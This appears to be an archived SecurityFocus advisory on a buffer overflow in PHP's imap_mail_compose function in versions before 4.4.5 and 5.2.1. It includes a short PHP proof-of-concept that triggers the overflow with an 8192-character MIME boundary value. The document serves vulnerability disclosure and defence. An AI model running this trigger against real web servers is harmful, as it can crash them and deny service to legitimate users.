source: http://www.securityfocus.com/bid/23234/info

PHP is prone to a buffer-overflow vulnerability because the application fails to perform boundary checks before copying user-supplied data to insufficiently sized memory buffers.

An attacker can exploit this issue to execute arbitrary machine code in the context of the affected webserver. Failed exploit attempts will likely crash the webserver, denying service to legitimate users.

This issue affects PHP versions prior to 4.4.5 and 5.2.1. 

<?php

$envelope["from"]= "joe@example.com";
$envelope["to"]  = "foo@example.com";

$part1["type"] = TYPEMULTIPART;
$part1["subtype"] = "mixed";
$part1["type.parameters"] = array("BOUNDARY" => str_repeat("A",8192));

$part2["type"] = TYPETEXT;
$part2["subtype"] = "plain";
$part2["description"] = "description3";
$part2["contents.data"] = "contents.data3\n\n\n\t";

$body[1] = $part1;
$body[2] = $part2;

imap_mail_compose($envelope, $body);

?>